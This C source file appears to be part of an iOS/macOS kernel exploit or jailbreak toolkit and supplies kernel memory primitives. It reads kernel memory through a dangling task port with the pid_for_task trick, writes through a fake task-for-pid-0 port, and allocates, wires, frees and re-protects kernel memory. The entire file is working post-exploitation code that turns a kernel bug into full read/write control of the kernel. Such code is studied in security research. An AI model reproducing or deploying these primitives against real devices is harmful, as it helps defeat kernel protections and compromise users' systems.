#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <mach/mach.h>

#include "kmem.h"
#include "kutils.h"

// the exploit bootstraps the full kernel memory read/write with a fake
// task which just allows reading via the bsd_info->pid trick
// this first port is kmem_read_port
mach_port_t kmem_read_port = MACH_PORT_NULL;
void prepare_rk_via_kmem_read_port(mach_port_t port) {
    kmem_read_port = port;
}

mach_port_t tfp0 = MACH_PORT_NULL;
void prepare_rwk_via_tfp0(mach_port_t port) {
    tfp0 = port;
}

void prepare_for_rw_with_fake_tfp0(mach_port_t fake_tfp0) {
  tfp0 = fake_tfp0;
}

int have_kmem_read() {
    return (kmem_read_port != MACH_PORT_NULL) || (tfp0 != MACH_PORT_NULL);
}

int have_kmem_write() {
    return (tfp0 != MACH_PORT_NULL);
}

void wk32(uint64_t kaddr, uint32_t val) {
  if (tfp0 == MACH_PORT_NULL) {
    printf("attempt to write to kernel memory before any kernel memory write primitives available\n");
    sleep(3);
    return;
  }
  
  kern_return_t err;
  err = mach_vm_write(tfp0,
                      (mach_vm_address_t)kaddr,
                      (vm_offset_t)&val,
                      (mach_msg_type_number_t)sizeof(uint32_t));
  
  if (err != KERN_SUCCESS) {
    printf("tfp0 write failed: %s %x\n", mach_error_string(err), err);
    return;
  }
}

void wk64(uint64_t kaddr, uint64_t val) {
  uint32_t lower = (uint32_t)(val & 0xffffffff);
  uint32_t higher = (uint32_t)(val >> 32);
  wk32(kaddr, lower);
  wk32(kaddr+4, higher);
}

uint32_t rk32_via_kmem_read_port(uint64_t kaddr) {
    kern_return_t err;
    if (kmem_read_port == MACH_PORT_NULL) {
        printf("kmem_read_port not set, have you called prepare_rk?\n");
        sleep(10);
        exit(EXIT_FAILURE);
    }
    
    mach_port_context_t context = (mach_port_context_t)kaddr - 0x10;
    err = mach_port_set_context(mach_task_self(), kmem_read_port, context);
    if (err != KERN_SUCCESS) {
        printf("error setting context off of dangling port: %x %s\n", err, mach_error_string(err));
        sleep(10);
        exit(EXIT_FAILURE);
    }
    
    // now do the read:
    uint32_t val = 0;
    err = pid_for_task(kmem_read_port, (int*)&val);
    if (err != KERN_SUCCESS) {
        printf("error calling pid_for_task %x %s", err, mach_error_string(err));
        sleep(10);
        exit(EXIT_FAILURE);
    }
    
    return val;
}

uint32_t rk32_via_tfp0(uint64_t kaddr) {
    kern_return_t err;
    uint32_t val = 0;
    mach_vm_size_t outsize = 0;
    err = mach_vm_read_overwrite(tfp0,
                                 (mach_vm_address_t)kaddr,
                                 (mach_vm_size_t)sizeof(uint32_t),
                                 (mach_vm_address_t)&val,
                                 &outsize);
    if (err != KERN_SUCCESS){
        printf("tfp0 read failed %s addr: 0x%llx err:%x port:%x\n", mach_error_string(err), kaddr, err, tfp0);
        sleep(3);
        return 0;
    }
    
    if (outsize != sizeof(uint32_t)){
        printf("tfp0 read was short (expected %lx, got %llx\n", sizeof(uint32_t), outsize);
        sleep(3);
        return 0;
    }
    return val;
}

uint32_t rk32(uint64_t kaddr) {
    if (tfp0 != MACH_PORT_NULL) {
        return rk32_via_tfp0(kaddr);
    }
    
    if (kmem_read_port != MACH_PORT_NULL) {
        return rk32_via_kmem_read_port(kaddr);
    }
    
    printf("attempt to read kernel memory but no kernel memory read primitives available\n");
    sleep(3);
    
    return 0;
}

uint64_t rk64(uint64_t kaddr) {
  uint64_t lower = rk32(kaddr);
  uint64_t higher = rk32(kaddr+4);
  uint64_t full = ((higher<<32) | lower);
  return full;
}

void wkbuffer(uint64_t kaddr, void* buffer, uint32_t length) {
    if (tfp0 == MACH_PORT_NULL) {
        printf("attempt to write to kernel memory before any kernel memory write primitives available\n");
        sleep(3);
        return;
    }
    
    kern_return_t err;
    err = mach_vm_write(tfp0,
                        (mach_vm_address_t)kaddr,
                        (vm_offset_t)buffer,
                        (mach_msg_type_number_t)length);
    
    if (err != KERN_SUCCESS) {
        printf("tfp0 write failed: %s %x\n", mach_error_string(err), err);
        return;
    }
}

void rkbuffer(uint64_t kaddr, void* buffer, uint32_t length) {
    kern_return_t err;
    mach_vm_size_t outsize = 0;
    err = mach_vm_read_overwrite(tfp0,
                                 (mach_vm_address_t)kaddr,
                                 (mach_vm_size_t)length,
                                 (mach_vm_address_t)buffer,
                                 &outsize);
    if (err != KERN_SUCCESS){
        printf("tfp0 read failed %s addr: 0x%llx err:%x port:%x\n", mach_error_string(err), kaddr, err, tfp0);
        sleep(3);
        return;
    }
    
    if (outsize != length){
        printf("tfp0 read was short (expected %lx, got %llx\n", sizeof(uint32_t), outsize);
        sleep(3);
        return;
    }
}

const uint64_t kernel_address_space_base = 0xffff000000000000;
void kmemcpy(uint64_t dest, uint64_t src, uint32_t length) {
    if (dest >= kernel_address_space_base) {
        // copy to kernel:
        wkbuffer(dest, (void*) src, length);
    } else {
        // copy from kernel
        rkbuffer(src, (void*)dest, length);
    }
}

uint64_t kmem_alloc(uint64_t size) {
    if (tfp0 == MACH_PORT_NULL) {
        printf("attempt to allocate kernel memory before any kernel memory write primitives available\n");
        sleep(3);
        return 0;
    }
    
    kern_return_t err;
    mach_vm_address_t addr = 0;
    mach_vm_size_t ksize = round_page_kernel(size);
    err = mach_vm_allocate(tfp0, &addr, ksize, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) {
        printf("unable to allocate kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
        sleep(3);
        return 0;
    }
    return addr;
}

uint64_t kmem_alloc_wired(uint64_t size) {
    if (tfp0 == MACH_PORT_NULL) {
        printf("attempt to allocate kernel memory before any kernel memory write primitives available\n");
        sleep(3);
        return 0;
    }
    
    kern_return_t err;
    mach_vm_address_t addr = 0;
    mach_vm_size_t ksize = round_page_kernel(size);
    
    printf("vm_kernel_page_size: %lx\n", vm_kernel_page_size);
    
    err = mach_vm_allocate(tfp0, &addr, ksize+0x4000, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) {
        printf("unable to allocate kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
        sleep(3);
        return 0;
    }
    
    printf("allocated address: %llx\n", addr);
    
    addr += 0x3fff;
    addr &= ~0x3fffull;
    
    printf("address to wire: %llx\n", addr);
    
    err = mach_vm_wire(fake_host_priv(), tfp0, addr, ksize, VM_PROT_READ|VM_PROT_WRITE);
    if (err != KERN_SUCCESS) {
        printf("unable to wire kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
        sleep(3);
        return 0;
    }
    return addr;
}

void kmem_free(uint64_t kaddr, uint64_t size) {
    if (tfp0 == MACH_PORT_NULL) {
        printf("attempt to deallocate kernel memory before any kernel memory write primitives available\n");
        sleep(3);
        return;
    }
    
    kern_return_t err;
    mach_vm_size_t ksize = round_page_kernel(size);
    err = mach_vm_deallocate(tfp0, kaddr, ksize);
    if (err != KERN_SUCCESS) {
        printf("unable to deallocate kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
        sleep(3);
        return;
    }
}

void kmem_protect(uint64_t kaddr, uint32_t size, int prot) {
    if (tfp0 == MACH_PORT_NULL) {
        printf("attempt to change protection of kernel memory before any kernel memory write primitives available\n");
        sleep(3);
        return;
    }
    kern_return_t err;
    err = mach_vm_protect(tfp0, (mach_vm_address_t)kaddr, (mach_vm_size_t)size, 0, (vm_prot_t)prot);
    if (err != KERN_SUCCESS) {
        printf("unable to change protection of kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
        sleep(3);
        return;
    }
}
